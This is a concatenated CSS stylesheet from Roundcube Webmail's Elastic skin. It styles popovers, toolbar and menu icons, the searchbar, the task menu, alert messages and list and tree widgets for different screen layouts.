 html.layout-small #rcmKSearchpane,
 html.layout-phone #rcmKSearchpane {
   bottom: auto;
   border: 1px solid #ced4da;
 }
 html.layout-phone #rcmKSearchpane {
   max-width: 100% !important;
 }
 html.layout-small .popover:not(.select-menu),
 html.layout-phone .popover:not(.select-menu) {
   margin: 0 !important;
   padding: 0;
   right: 0;
   left: initial !important;
   bottom: 0;
   top: 0;
   width: 272px;
   transform: none !important;
   border-radius: 0;
   border: 0;
   display: flex;
   flex-direction: column;
   box-shadow: none;
 }
 html.layout-small .popover:not(.select-menu) div.arrow,
 html.layout-phone .popover:not(.select-menu) div.arrow {
   display: none;
 }
 html.layout-small .popover:not(.select-menu) .listing li:last-child,
 html.layout-phone .popover:not(.select-menu) .listing li:last-child {
   border-bottom: 1px solid #f1f3f4;
 }
 html.layout-small .popover-overlay,
 html.layout-phone .popover-overlay {
   z-index: 1000;
   background-color: rgba(44, 54, 58, 0.5);
   position: absolute;
   top: 0;
   bottom: 0;
   width: 100%;
 }
 html.layout-small .popover-header,
 html.layout-phone .popover-header {
   display: block;
   border-radius: 0;
   border: 0;
   padding: 0 0.5em;
   height: 58px;
   min-height: 58px;
   line-height: 58px;
   font-size: 16px;
   color: #fff;
   background-color: #00131a;
 }
 html.layout-small .popover-header:before,
 html.layout-phone .popover-header:before {
   display: none;
 }
 html.layout-small .popover-header a,
 html.layout-phone .popover-header a {
   display: inline-block;
   width: 100%;
 }
 html.layout-small .popover-body > *,
 html.layout-phone .popover-body > * {
   max-height: 100% !important;
 }
 html.touch .popover .listing li a {
   line-height: 47px;
   font-size: 16px;
   padding: 0 0.5em;
 }
 html.touch .popover .listing li a:before {
   float: left;
 }
 .select-menu {
   max-width: initial;
   margin: 0;
 }
 .select-menu .listing li a {
   padding-left: 0.25rem;
   outline: 0;
 }
 .select-menu .popover-header {
   border-radius: 0.25rem 0.25rem 0 0 !important;
 }
 /** PGP Key search/import dialog **/
 .pgpkeyimport div.key {
   position: relative;
   padding: 0.5rem 0;
 }
 .pgpkeyimport div.key.revoked,
 .pgpkeyimport div.key.disabled {
   color: #737677;
 }
 .pgpkeyimport div.key label {
   display: inline-block;
   margin-right: 0.5em;
   margin-bottom: 0;
 }
 .pgpkeyimport div.key label:after {
   content: ":";
 }
 .pgpkeyimport div.key label.keyid {
   display: none;
 }
 .pgpkeyimport div.key label + a,
 .pgpkeyimport div.key label + span {
   line-height: 2.6rem;
   margin-right: 1em;
   white-space: nowrap;
   text-decoration: none;
 }
 .pgpkeyimport div.key label.keyid + a {
   font-weight: bold;
 }
 .pgpkeyimport div.key label.keyid + a:before {
   content: "\f084";
 }
 .pgpkeyimport ul.uids {
   margin: 0;
   padding: 0;
 }
 .pgpkeyimport li.uid {
   border: 0;
   padding: 0.25rem 0 0 1.5em;
   line-height: 1.5rem !important;
   list-style-type: none;
 }
 .pgpkeyimport li.uid:before {
   content: "\f007";
   opacity: 0.25;
   font-size: 1em;
   line-height: 1.25;
 }
 .pgpkeyimport button.importkey {
   position: absolute;
   top: 0.5rem;
   right: 0;
 }
 .pgpkeyimport button:disabled {
   display: none;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Toolbar widget ***/
 .menu {
   margin: 0;
   text-align: center;
   white-space: nowrap;
 }
 .menu a {
   overflow: hidden;
   text-overflow: ellipsis;
   text-decoration: none;
 }
 .menu a:before {
   content: "\00a0";
 }
 .menu a:hover,
 .menu a:focus {
   outline: 0;
 }
 .menu a:not(.disabled):focus,
 .menu a:not(.disabled):hover {
   background-color: #c5d7e1;
 }
 .menu.toolbar li {
   display: inline-block;
   height: 58px;
 }
 .menu.toolbar a {
   color: #2c363a;
   display: block;
   float: left;
   border: 0 !important;
   height: 58px;
   min-width: 3.2rem;
   max-width: 6rem;
   width: auto;
   padding: 0.45rem;
   line-height: 1.5;
   cursor: pointer;
   font-size: 1rem;
   text-align: center;
 }
 .menu.toolbar a:before {
   height: 1.75rem !important;
   float: none !important;
   width: auto !important;
   margin: 0 !important;
 }
 .menu.toolbar a.selected {
   color: #41b849;
 }
 .menu.toolbar > .spacer {
   width: 1em;
 }
 .menu.toolbar .dropbutton:not(.disabled):hover {
   background-color: #c5d7e1;
 }
 .menu.toolbar .dropbutton a.dropdown {
   padding: 0 0.3rem;
 }
 .menu.toolbar .dropbutton a.dropdown:before {
   line-height: 58px;
 }
 .menu.toolbar .dropbutton a.dropdown:hover {
   background-color: #b4ccd8;
 }
 .menu span.inner {
   font-size: 90%;
   font-weight: normal;
 }
 .menu .dropbutton {
   display: inline-block;
 }
 .menu .dropbutton a.dropdown {
   font-size: 75%;
   min-width: 0;
 }
 html.ie11 .menu .dropbutton a.dropdown:before {
   font-size: 80%;
 }
 .menu .dropbutton a.dropdown span.inner {
   display: none;
 }
 .menu .dropbutton a:first-child {
   padding-right: 0;
 }
 .menu.pagenav {
   display: flex;
   justify-content: space-between;
   align-items: center;
   padding: 0 !important;
   font-size: 100%;
 }
 .menu.pagenav a {
   flex-grow: 1;
   display: inline-block;
   min-width: 2rem !important;
   height: 35px;
   color: #2c363a;
 }
 .menu.pagenav a:before {
   margin: 0;
   display: inline;
   float: none;
   line-height: 35px;
 }
 .menu.pagenav .pagenav-text {
   overflow: hidden;
   text-overflow: ellipsis;
   color: #737677;
   flex-grow: 4;
   font-size: 80%;
 }
 .menu.pagenav input {
   width: 3rem;
   max-width: 5rem;
   font-size: 90%;
   text-align: center;
   max-height: 1.6rem;
   margin: 0 0.2rem;
 }
 html.layout-phone .menu.pagenav input {
   display: none;
 }
 .menu.pagenav span.inner {
   display: none;
 }
 .menu.pagenav.pagenav-list {
   cursor: pointer;
   background-color: #fbfbfb;
   border-bottom: 1px solid #f1f3f4;
 }
 .menu.pagenav.pagenav-list a {
   flex-grow: unset;
 }
 .menu.pagenav.pagenav-list .pagenav-text {
   text-align: left;
   font-size: 100%;
 }
 .menu.pagenav.pagenav-list + .navlist {
   background-color: #fbfbfb;
 }
 .menu.pagenav.pagenav-list.expanded + .navlist {
   border-bottom: 1px solid #d4dbde;
 }
 .menu.content-frame-navigation.hide-nav-buttons a.next,
 .menu.content-frame-navigation.hide-nav-buttons a.prev {
   display: none;
 }
 .menu .listselectors {
   max-width: 100%;
   display: flex;
   justify-content: space-around;
 }
 .menu .buttons {
   display: block;
 }
 .menu .buttons button {
   display: block;
   float: left;
   cursor: pointer;
   color: #2c363a;
   background-color: transparent;
   border: 0;
   padding: 0;
   height: 58px;
   line-height: 58px;
   width: 2.5em;
 }
 .menu .buttons button:before {
   font-size: 1.75rem;
 }
 .popover .menu li {
   display: block;
   height: auto;
   text-align: left;
 }
 .popover .menu li.spacer {
   display: none;
 }
 .popover .menu li:last-child {
   border: 0;
 }
 .popover .menu li.separator {
   line-height: 1.5rem !important;
   font-size: 0.75rem !important;
   padding: 0 0.5rem;
   color: #737677;
   background-color: #f1f3f4;
 }
 .popover .menu li.separator label {
   margin: 0;
 }
 .popover .menu li a {
   height: unset;
   max-width: 100%;
   width: 100%;
   line-height: 35px;
   display: block;
   padding: 0 0.5rem;
   text-align: left;
 }
 .popover .menu li a:before {
   line-height: inherit;
   height: inherit !important;
   margin-right: 0.5rem !important;
   float: left !important;
   width: 1.18em !important;
   min-width: 1.18em;
 }
 .popover .menu li a:not(.disabled):hover {
   color: #fff;
   background-color: #0099cc;
 }
 .popover .menu li a[aria-haspopup] {
   display: flex;
 }
 .popover .menu li a[aria-haspopup]:after {
   color: #737677;
   font-size: 0.9em;
   margin: 0 0 0 0.2em;
   min-width: 1.18em;
   content: "\f054";
 }
 html.layout-small .popover .menu li a[aria-haspopup]:after {
   margin: 0 0.2em;
 }
 .popover .menu li a[aria-haspopup].dropdown:after {
   color: #2c363a;
   margin: 0 0.6em !important;
 }
 .popover .menu li a[aria-haspopup]:hover:after {
   color: #fff;
 }
 .popover .menu li a[aria-haspopup] > span {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
 }
 .popover .menu li span.inner {
   font-size: 100%;
 }
 .popover .menu .dropbutton {
   display: flex;
 }
 .popover .menu .dropbutton a:first-child {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
 }
 .popover .menu .dropbutton:not(.disabled):hover {
   background-color: #f6f6f6;
 }
 .popover .menu .dropbutton a.dropdown {
   width: 3.5rem;
   padding: 0 0.5em;
   background-color: #f6f6f6;
 }
 .popover .menu .dropbutton a.dropdown:hover {
   background-color: #0099cc;
 }
 .popover .menu .dropbutton a.dropdown:before,
 .popover .menu .dropbutton a.dropdown span.inner {
   display: none;
 }
 .popover .menu.no-icon a:before {
   display: none;
 }
 @media screen and (min-width: 769px) {
   .content-frame-navigation {
     display: none !important;
   }
   .header a.button.icon:not(.disabled):focus,
   .header a.button.icon:not(.disabled):hover {
     background-color: #c5d7e1;
     outline: 0;
   }
   .header a.button.icon:before {
     margin: 0;
   }
 }
 @media screen and (max-width: 768px) {
   .menu.footer {
     justify-content: space-around !important;
   }
   .menu.footer > * {
     flex-grow: 1;
   }
   .menu.footer .buttons {
     display: flex;
     justify-content: space-evenly;
   }
   .menu.footer .listselectors > * {
     flex-grow: 1;
   }
   .menu.listing a {
     color: #2c363a;
   }
 }
 @media screen and (min-width: 1201px) {
   a.toolbar-button {
     line-height: 1.5;
     padding: 0.45rem;
   }
   a.toolbar-button:before {
     float: none !important;
     height: 1.75rem !important;
     line-height: 1.5;
     width: auto !important;
   }
   a.toolbar-button span.inner {
     display: inline !important;
     font-weight: normal;
     font-size: 90%;
   }
 }
 /*** Menu button icons ***/
 .menu a.mail:before {
   content: "\f0e0";
 }
 .menu a.contacts:before {
   content: "\f0c0";
 }
 .menu a.options:before {
   content: "\f1de";
 }
 .menu a.settings:before {
   content: "\f013";
 }
 .menu a.help:before {
   content: "\f1cd";
 }
 .menu a.logout:before {
   content: "\f011";
 }
 .menu a.about:before {
   content: "\f128";
 }
 .menu a.refresh:before {
   content: "\f021";
 }
 .menu a.compose:before {
   content: "\f044";
 }
 .menu a.calendar:before {
   content: "\f073";
 }
 .menu a.tasklist:before {
   content: "\f0ae";
 }
 .menu a.files:before {
   content: "\f07b";
 }
 .menu a.notes:before {
   content: "\f249";
 }
 .menu a.chat:before {
   content: "\f086";
 }
 .menu a.actions:before {
   content: "\f013";
 }
 .menu a.addressbook:before {
   content: "\f007";
 }
 .menu a.archive:before {
   content: "\f187";
 }
 .menu a.assigngroup:before {
   content: "\f234";
 }
 .menu a.attach:before,
 .menu a.vcard:before {
   content: "\f0c6";
 }
 .menu a.next:before {
   content: "\f061";
 }
 .menu a.prev:before,
 .menu a.back:before {
   content: "\f060";
 }
 .menu a.check:before {
   content: "";
 }
 .menu a.check.selected:before {
   content: "\f00c";
 }
 .menu a.closewin:before {
   content: "\f410";
 }
 .menu a.collapse:before {
   content: "\f107";
 }
 .menu a.copy:before {
   content: "\f0c5";
 }
 .menu a.create:before {
   content: "\f0fe";
 }
 .menu a.delete:before {
   content: "\f2ed";
 }
 .menu a.download:before,
 .menu a.download.eml:before,
 .menu a.download.maildir:before,
 .menu a.download.mbox:before {
   content: "\f019";
 }
 .menu a.dropdown:before {
   content: "\f0d7";
 }
 .menu a.edit:before {
   content: "\f303";
 }
 .menu a.encrypt:before,
 .menu a.enigma:before {
   content: "\f023";
 }
 .menu a.encrypt.sign:before {
   content: "\f023";
 }
 .menu a.expand:before {
   content: "\f105";
 }
 .menu a.expand.all:before {
   content: "\f103";
 }
 .menu a.expand.none:before {
   content: "\f102";
 }
 .menu a.export:before,
 .menu a.export.all:before,
 .menu a.export.selection:before {
   content: "\f019";
 }
 .menu a.expunge:before {
   content: "\f78c";
 }
 .menu a.extwin:before {
   content: "\f360";
 }
 .menu a.filterlink:before {
   content: "\f0b0";
 }
 .menu a.firstpage:before {
   content: "\f100";
 }
 .menu a.nextpage:before {
   content: "\f105";
 }
 .menu a.prevpage:before {
   content: "\f104";
 }
 .menu a.lastpage:before {
   content: "\f101";
 }
 .menu a.flag:before,
 .menu a.select.flagged:before {
   content: "\f024";
   font-weight: 900;
 }
 .menu a.unflag:before {
   content: "\f024";
   font-weight: 400;
 }
 .menu a.folders:before {
   content: "\f07b";
 }
 .menu a.forward:before,
 .menu a.forward.attachment:before,
 .menu a.forward.bounce:before,
 .menu a.forward.inline:before {
   content: "\f064";
 }
 .menu a.import:before,
 .menu a.upload:before {
   content: "\f093";
 }
 .menu a.insertresponse:before {
   content: "\f075";
 }
 .menu a.junk:before {
   content: "\f7e4";
 }
 .menu a.notjunk:before {
   content: "\f01c";
 }
 .menu a.markmessage:before {
   content: "\f02b";
 }
 .menu a.more:before {
   content: "\f141";
 }
 .menu a.move:before {
   content: "\f07c";
 }
 .menu a.print:before {
   content: "\f02f";
 }
 .menu a.properties:before {
   content: "\f15b";
 }
 .menu a.purge:before {
   content: "\f12d";
 }
 .menu a.qrcode:before {
   content: "\f029";
 }
 .menu a.read:before {
   content: "\f2b6";
   font-weight: 400;
 }
 .menu a.unread:before,
 .menu a.expand.unread:before,
 .menu a.select.unread:before {
   content: "\f0e0";
   font-weight: 900;
 }
 .menu a.recipient:before {
   content: "\f0e0";
   font-weight: 400;
 }
 .menu a.refresh:before {
   content: "\f021";
 }
 .menu a.remove:before {
   content: "\f12d";
 }
 .menu a.removegroup:before {
   content: "\f235";
 }
 .menu a.rename:before {
   content: "\f303";
 }
 .menu a.reply:before {
   content: "\f3e5";
 }
 .menu a.reply-all:before,
 .menu a.reply.all:before,
 .menu a.reply.list:before {
   content: "\f122";
 }
 .menu a.responses:before {
   content: "\f075";
 }
 .menu a.rotate:before {
   content: "\f2f9";
 }
 .menu a.save:before {
   content: "\f0c7";
   font-weight: 400;
 }
 .menu a.search:before {
   content: "\f002";
 }
 .menu a.search.delete:before {
   content: "\f2ed";
 }
 .menu a.select:before {
   content: "\f245";
 }
 .menu a.select.all:before {
   content: "\f069";
 }
 .menu a.select.invert:before {
   content: "\f14a";
 }
 .menu a.select.none:before {
   content: "\f00d";
   font-weight: 900;
 }
 .menu a.select.page:before {
   content: "\f0c9";
   font-weight: 900;
 }
 .menu a.selection:before {
   content: "\f14a" !important;
   font-weight: 400 !important;
 }
 .menu a.send:before {
   content: "\f1d8";
 }
 .menu a.showurl:before {
   content: "\f0c1";
 }
 .menu a.signature:before {
   content: "\f5b7";
 }
 .menu a.source:before {
   content: "\f1c9";
 }
 .menu a.spellcheck:before {
   content: "\f891";
 }
 .menu a.status:before {
   content: "\f0eb";
   font-weight: 400;
 }
 .menu a.submit:before {
   content: "\f00c";
 }
 .menu a.threads:before {
   content: "\f086";
 }
 .menu a.zoomin:before {
   content: "\f00e";
 }
 .menu a.zoomout:before {
   content: "\f010";
 }
 /*** Searchbar and searchoptions widgets ***/
 .searchbar {
   height: 36px;
   min-height: 36px;
   line-height: 36px;
   background-color: #fbfbfb;
   border-bottom: 1px solid #f1f3f4;
   display: flex;
   align-items: center;
   overflow: hidden;
   position: relative;
 }
 .searchbar form {
   flex: 1;
   display: flex;
 }
 .searchbar form:before {
   content: "\f002";
   height: 36px;
   color: #737677;
   margin: 0 0 0 0.75rem;
 }
 .searchbar input {
   width: 100%;
   border: 0;
   background: transparent;
   padding: 0.5rem;
   line-height: normal;
   outline: 0;
 }
 .searchbar input::-ms-clear {
   display: none;
 }
 .searchbar a {
   color: #2c363a;
 }
 .searchbar a:before {
   width: 2rem;
   height: 36px;
   margin: 0;
 }
 .searchbar a.options:before {
   content: "\f107";
 }
 .searchbar a.reset:before {
   content: "\f00d";
   font-size: 1rem;
 }
 .searchbar a.unread:before {
   content: "\f0e0";
   font-weight: 900;
 }
 .searchbar a.reset,
 .searchbar a.search {
   display: none;
 }
 .searchbar a.selected {
   color: #41b849;
 }
 .searchbar span.inner {
   display: none;
 }
 .searchbar.active a.reset {
   display: inline;
 }
 .searchbar.open a.options:before {
   content: "\f106";
 }
 .searchoptions button.search {
   width: 100%;
 }
 .searchoptions ul.proplist + div {
   margin-top: 1rem;
 }
 .searchoptions .input-group:not(:last-child) {
   margin-bottom: 0.5rem;
 }
 .searchoptions .input-group .input-group-prepend {
   width: 30%;
 }
 .searchoptions .input-group label {
   width: 100%;
 }
 .searchoptions .formbuttons {
   display: block !important;
 }
 /*** Taskmenu ***/
 #taskmenu a {
   display: block;
   float: none;
 }
 @media screen and (max-width: 480px) {
   #taskmenu {
     z-index: 30001;
     overflow-x: hidden;
   }
   #taskmenu a {
     max-width: unset;
     padding: 0 0.5em;
     margin-top: 1px;
     text-align: left;
     line-height: 47px;
     height: 47px;
     border-bottom: 1px solid #f1f3f4 !important;
     color: #2c363a;
     font-size: 1.2rem;
   }
   #taskmenu a:before {
     float: left !important;
     width: 1.2em !important;
     margin-right: 0.5rem !important;
   }
   #taskmenu span.inner {
     font-size: 100%;
   }
 }
 @media screen and (min-width: 481px) {
   #taskmenu a {
     color: #cfdee6;
     padding: 0.45rem 0;
     min-width: unset;
   }
   #taskmenu a.selected {
     color: #cfdee6;
     background: #1a1a1a;
   }
   #taskmenu a.selected:hover {
     color: #fff;
     background: #1a1a1a;
   }
   #taskmenu a:hover {
     color: #cfdee6;
     background: #1a1a1a;
   }
   #taskmenu .special-buttons {
     position: absolute;
     bottom: 0;
     left: 0;
     background-color: #000000;
   }
   #taskmenu .action-buttons a {
     color: #cfdee6;
     background: transparent;
   }
   #taskmenu .action-buttons a:hover {
     color: #cfdee6;
     background: #1a1a1a;
   }
   #taskmenu a.logout {
     color: #cfdee6 !important;
   }
 }
 @media screen and (min-width: 481px) and (max-width: 1024px) {
   #taskmenu a {
     width: 42px;
     height: 42px;
     font-size: 1.2rem;
     padding: 0;
   }
   #taskmenu a:before {
     line-height: 42px;
   }
   #taskmenu span.inner {
     display: none;
   }
 }
 @media screen and (min-width: 1025px) {
   #taskmenu a {
     width: 78px;
     font-size: 1rem;
   }
   #taskmenu a:before {
     float: none;
   }
   #taskmenu a:focus {
     background-color: #1a1a1a;
   }
   #taskmenu span.inner {
     padding: 0 0.1em;
   }
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** UI Messages ***/
 .ui.alert {
   margin: 0;
   margin-bottom: 0.2rem;
   opacity: 0.95;
   width: 100%;
   padding: 0.75em;
   color: #2c363a;
   border: 1px solid transparent;
   background-color: rgba(0, 153, 204, 0.05);
   display: flex;
   align-items: center;
 }
 @media screen and (max-width: 480px) {
   .ui.alert {
     border: 0;
   }
 }
 .ui.alert span {
   margin: auto 0;
 }
 .ui.alert > i.icon {
   line-height: 1;
   color: #4d5f66;
   margin: auto 0;
 }
 .ui.alert > i.icon:before {
   content: "\f05a";
   margin-right: 0.6rem;
 }
 .ui.alert .btn {
   margin-left: 0.5rem;
 }
 .ui.alert.loading {
   color: #6b7275;
 }
 .ui.alert.loading > i.icon:before {
   content: "\f1ce";
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
   width: 1em;
 }
 .ui.alert.alert-success > i.icon:before {
   content: "\f058";
   color: #41b849;
 }
 .ui.alert.alert-warning > i.icon:before {
   content: "\f071";
   color: #ffd452;
 }
 .ui.alert.alert-danger > i.icon:before {
   content: "\f06a";
   color: #EC1313;
 }
 .ui.alert.vcardattachment > i.icon:before {
   content: "\f2bb";
 }
 .ui.alert.enigmaattachment > i.icon:before {
   content: "\f084";
 }
 .ui.alert.signed > i.icon:before,
 .ui.alert.encrypted > i.icon:before {
   content: "\f023";
 }
 .ui.alert.chat > i.icon:before {
   content: "\f075";
 }
 .ui.alert .boxbuttons {
   white-space: nowrap;
 }
 .ui.alert .boxbuttons .btn {
   overflow: hidden;
   text-overflow: ellipsis;
   max-width: 220px;
 }
 @media screen and (max-width: 480px) {
   .ui.alert .boxbuttons {
     display: flex;
     flex-direction: column;
   }
   .ui.alert .boxbuttons .btn {
     max-width: 160px;
   }
   .ui.alert .boxbuttons .btn:not(:first-child) {
     margin-top: 0.25rem;
   }
 }
 .ui.alert.aligned-buttons {
   display: flex;
 }
 .ui.alert.aligned-buttons span {
   flex: 1;
 }
 .ui.alert a:not(.btn) {
   color: #0099cc;
   font-weight: normal;
 }
 .ui.alert h3 {
   font-weight: bold;
   font-size: 1.2rem;
 }
 .ui.alert p {
   margin: 1rem 0;
 }
 .ui.alert.boxerror,
 .ui.alert.boxconfirmation,
 .ui.alert.boxinformation,
 .ui.alert.boxwarning {
   padding: 0.5em;
   border-radius: 0;
 }
 .ui.alert.boxerror i.icon,
 .ui.alert.boxconfirmation i.icon,
 .ui.alert.boxinformation i.icon,
 .ui.alert.boxwarning i.icon {
   font-size: 1.5em !important;
 }
 .ui.alert.boxerror {
   background-color: rgba(236, 19, 19, 0.15);
 }
 .ui.alert.boxinformation {
   background-color: rgba(0, 153, 204, 0.15);
 }
 .ui.alert.boxconfirmation {
   background-color: rgba(65, 184, 73, 0.15);
 }
 .ui.alert.boxwarning {
   background-color: rgba(255, 255, 102, 0.25);
 }
 .ui.alert + table {
   margin-top: 1em;
 }
 #messagestack {
   position: absolute;
   bottom: 0.5em;
   right: 0.7em;
   z-index: 105;
   width: 320px;
   height: auto;
   max-height: 85%;
 }
 @media screen and (max-width: 480px) {
   #messagestack {
     left: 0;
     right: 0;
     bottom: 0;
     width: auto;
   }
 }
 #messagestack div {
   background-color: #2c363a;
   color: #fff;
 }
 @media screen and (max-width: 480px) {
   #messagestack div {
     margin: 0;
     border-radius: 0;
     min-height: 4.2rem;
   }
 }
 #messagestack div.voice {
   position: absolute;
   top: -1000px;
 }
 #messagestack div i.icon {
   font-size: 1.5em !important;
 }
 #messagestack div > i.icon:before {
   color: #fff;
 }
 #messagestack div:last-child {
   margin-bottom: 0;
 }
 #messagestack .loading {
   background-color: #6b7275;
 }
 #messagestack .alert-info.information {
   background-color: #0099cc;
 }
 #messagestack .alert-success {
   background-color: #41b849;
 }
 #messagestack .alert-warning {
   background-color: #ffd452;
 }
 #messagestack .alert-danger {
   background-color: #EC1313;
 }
 #messagestack a {
   color: inherit !important;
   text-decoration: underline;
   cursor: pointer;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** List and treelist widgets ***/
 .listing tbody td,
 .listing li {
   border-bottom: 1px solid #f1f3f4;
   cursor: default;
   font-weight: normal;
   line-height: 35px;
 }
 .listing tbody td,
 .listing li a {
   padding: 0 0.5rem;
   white-space: nowrap;
   vertical-align: middle;
   color: #2c363a;
 }
 .listing tbody td {
   overflow: hidden;
   text-overflow: ellipsis;
   outline: none;
 }
 .listing tbody td a {
   color: #2c363a;
 }
 .listing li a {
   display: block;
   text-decoration: none;
   cursor: default;
   width: 100%;
 }
 .listing li.selected,
 .listing tr.selected td {
   color: #2c363a;
   background-color: #0099cc;
 }
 .listing td.selection {
   padding: 0 0 0 0.5em;
   width: 2em;
   text-align: center;
 }
 .listing td.selection > input {
   vertical-align: middle;
 }
 .listing:not(.withselection) td.selection {
   display: none;
 }
 .listing td.name {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .listing td.action {
   padding: 0 0.5em;
   width: 2em;
   text-align: center;
 }
 .listing td.action:empty {
   width: 0;
 }
 .listing td.action a {
   display: block;
   overflow: hidden;
   text-decoration: none;
 }
 .listing td.action a:before {
   margin: 0;
   font-size: 1rem;
 }
 .listing td.action a.pushgroup:before {
   content: "\f054";
 }
 .listing li.droptarget > a,
 .listing tr.droptarget > td {
   background-color: #ffffcc;
 }
 .listing li.disabled,
 .listing tr.disabled td {
   color: rgba(44, 54, 58, 0.5);
 }
 .listing li > a.virtual,
 .listing li.virtual > a {
   opacity: 0.4;
 }
 .listing span.secondary {
   color: #737677;
 }
 html:not(.touch) .listing li > a,
 html:not(.touch) .listing tbody tr > td:first-child,
 html:not(.touch) .listing:not(.withselection) tbody tr > td.selection + td {
   border-left: 2px solid transparent;
 }
 html:not(.touch) .listing li > a:focus,
 html:not(.touch) .listing.focus tbody tr.focused > td:first-child,
 html:not(.touch) .listing.focus:not(.withselection) tbody tr.focused > td.selection + td {
   border-left: 2px solid #33ccff;
   outline: 0;
 }
 table.listing {
   width: 100%;
   table-layout: fixed;
   border-spacing: 0;
   border-collapse: unset;
 }
 ul.listing {
   margin: 0;
   padding: 0;
 }
 ul.listing > ul {
   padding: 0;
 }
 ul.listing li {
   overflow: hidden;
   text-overflow: ellipsis;
   white-space: nowrap;
   position: relative;
   list-style: none;
 }
 ul.listing li ul {
   border-top: 1px solid #f1f3f4;
   padding-left: 1.5em;
 }
 ul.listing li ul li:last-child {
   border-bottom: none;
 }
 ul.listing li .custom-switch {
   position: absolute;
   padding: 0;
   top: 0;
   right: 0;
   height: 35px;
   vertical-align: middle;
 }
 ul.listing li .custom-switch .custom-control-label:before,
 ul.listing li .custom-switch .custom-control-label:after {
   margin-top: 0.4rem;
 }
 html.touch ul.listing li .custom-switch .custom-control-label:before,
 html.touch ul.listing li .custom-switch .custom-control-label:after {
   margin-top: 0.75rem;
 }
 ul.listing.simplelist li {
   padding: 0 0.5rem;
 }
 .listing-info {
   position: absolute;
   top: 50%;
   left: 50%;
   transform: translate(-50%, -50%);
   width: 80%;
   text-align: center;
   font-weight: bold;
   color: #737677;
 }
 html.touch .listing:not(.toolbar) li,
 html.touch .listing tbody td {
   line-height: 47px;
   font-size: 1.2rem;
 }
 html.touch li input[type=checkbox] {
   height: 47px;
 }
 html.touch td.selection {
   padding: 0;
   width: 3em;
 }
 @media screen and (max-width: 1200px) {
   .listing.selection-large-only li.selected {
     color: #2c363a;
     background-color: transparent;
   }
 }
 /* icons */
 .listing.iconized li a:before {
   height: 2em;
   margin-right: 0.5rem;
 }
 .listing.iconized li.preferences > a:before {
   content: "\f1de";
 }
 .listing.iconized li.folders > a:before {
   content: "\f07b";
 }
 .listing.iconized li.responses > a:before {
   content: "\f075";
 }
 .listing.iconized li.identities > a:before {
   content: "\f2c2";
 }
 .listing.iconized li.password > a:before {
   content: "\f023";
 }
 .listing.iconized li.addressbook a:before {
   content: "\f2b9";
   font-weight: 400;
 }
 .listing.iconized li.contactgroup a:before {
   content: "\f0c0";
   font-weight: 900;
 }
 .listing.iconized li.contactsearch a:before {
   content: "\f002";
 }
 .listing.iconized li.filter > a:before {
   content: "\f0b0";
 }
 .listing.iconized li.vacation > a:before {
   content: "\f017";
   font-weight: 400;
 }
 .listing.iconized li.forward > a:before {
   content: "\f14d";
 }
 .listing.iconized li.enigma.keys > a:before {
   content: "\f084";
 }
 .listing.iconized li.userinfo > a:before {
   content: "\f05a";
 }
 .listing.iconized li.twofactorauth > a:before {
   content: "\f2f6";
 }
 .listing.iconized li a.help:before {
   content: "\f1cd";
 }
 .listing.iconized li a.about:before {
   content: "\f059";
   font-weight: 400;
 }
 .listing.iconized li a.license:before {
   content: "\f3ed";
 }
 .listing.iconized li > i:before {
   content: "\f007";
   margin-left: 0.5rem;
 }
 .listing.iconized li.group > i:before {
   content: "\f0c0";
 }
 html.ie11 .listing.iconized li a:before {
   font-size: 1.25rem;
 }
 .listing.iconized tr td:before {
   margin-right: 0.5rem;
 }
 .listing.iconized tr.contact.person td.name:before {
   content: "\f007";
 }
 .listing.iconized tr.contact.group td.name:before {
   content: "\f0c0";
 }
 .listing.iconized tr.general > td.section:before {
   content: "\f108";
 }
 .listing.iconized tr.mailbox > td.section:before {
   content: "\f0e0";
   font-weight: 400;
 }
 .listing.iconized tr.mailview > td.section:before {
   content: "\f01c";
 }
 .listing.iconized tr.compose > td.section:before {
   content: "\f1d8";
 }
 .listing.iconized tr.addressbook > td.section:before {
   content: "\f0c0";
 }
 .listing.iconized tr.folders > td.section:before {
   content: "\f07b";
   font-weight: 400;
 }
 .listing.iconized tr.server > td.section:before {
   content: "\f233";
 }
 .listing.iconized tr.enigma > td.section:before {
   content: "\f023";
 }
 .listing.iconized tr.calendar > td.section:before {
   content: "\f133";
 }
 .listing.iconized tr.chat > td.section:before {
   content: "\f086";
 }
 /* selecatable list: e.g. spellcheck language selection */
 .listing.iconized.selectable li a:before {
   content: "";
 }
 .listing.iconized.selectable li a.selected:before {
   content: "\f00c";
 }
 .popupmenu .listing li > a {
   border-left: 0;
 }
 .popupmenu .listing li > a:not(.disabled):hover {
   color: #fff;
   background-color: #0099cc;
 }
 .popupmenu .listing li.selected {
   color: #fff;
   background-color: #0099cc;
 }
 .popupmenu .listing td {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 ul.treelist li div.treetoggle {
   position: absolute;
   top: 0;
   left: 0;
   width: 1.5em;
   cursor: pointer;
   background-color: transparent;
 }
 ul.treelist li div.treetoggle:before {
   content: "\f105";
   margin-left: 0.25em;
   font-size: 1em;
 }
 ul.treelist li div.treetoggle.expanded:before {
   content: "\f107";
 }
 ul.treelist li > a {
   overflow: hidden;
   text-overflow: ellipsis;
   padding-left: 1.5em;
 }
 ul.treelist li.selected {
   color: inherit;
   background-color: transparent;
 }
 ul.treelist li.selected > div > a,
 ul.treelist li.selected > a {
   color: #2c363a;
   background-color: #0099cc;
 }
